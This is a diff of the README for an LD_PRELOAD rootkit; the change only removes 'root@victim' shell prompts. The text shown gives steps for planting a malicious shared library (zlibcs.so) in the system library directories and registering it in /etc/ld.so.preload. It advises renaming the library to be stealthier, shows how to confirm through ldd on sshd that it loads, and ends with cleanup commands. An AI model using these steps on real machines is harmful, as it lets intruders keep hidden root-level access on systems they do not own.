@@ -11,13 +11,13 @@ On the target, copy the shared library/rootkit to where the other shared librari
 
 64-bit example:
 ```bash
-root@victim:~# cp zlibcs.so /lib/x86_64-linux-gnu/
-root@victim:~# cp zlibcs.so /lib/
+cp zlibcs.so /lib/x86_64-linux-gnu/
+cp zlibcs.so /lib/
 ```
 And copy the path of the rootkit into /etc/ld.so.preload.
 ```bash
-root@victim:~# echo "/lib/x86_64-linux-gnu/zlibcs.so" > /etc/ld.so.preload
-root@victim:~# echo "/lib/zlibcs.so" > /etc/ld.so.preload
+echo "/lib/x86_64-linux-gnu/zlibcs.so" > /etc/ld.so.preload
+echo "/lib/zlibcs.so" > /etc/ld.so.preload
 ```
 
 I would advise renaming `zlibcs.so` to something more stealthy.
@@ -25,14 +25,14 @@ I would advise renaming `zlibcs.so` to something more stealthy.
 ### Verify installation
 You can check if the rootkit is installed by running```ldd``` and checking that your malicious library gets loaded.
 ```bash
-root@victim:~# ldd /usr/sbin/sshd
+ldd /usr/sbin/sshd
 	linux-vdso.so.1 (0x00007ffe9214c000)
 	/lib/x86_64-linux-gnu/zlibcs.so (0x00007f17ed354000)
     [...]
 ```
 Also check /etc/ld.so.preload for your entry.
 ```bash
-root@victim:~# cat /etc/ld.so.preload 
+cat /etc/ld.so.preload 
 /lib/x86_64-linux-gnu/zlibcs.so
 ```
 
@@ -65,6 +65,6 @@ uid=0(root) gid=0(root) groups=0(root)
 Delete `/etc/ld.so.preload` and delete the maliciuos library. 
 Nothing else needed.
 ```bash
-root@victim:~# rm /etc/ld.so.preload
-root@victim:~# rm /lib/x86_64-linux-gnu/zlibcs.so
+rm /etc/ld.so.preload
+rm /lib/x86_64-linux-gnu/zlibcs.so
 ```
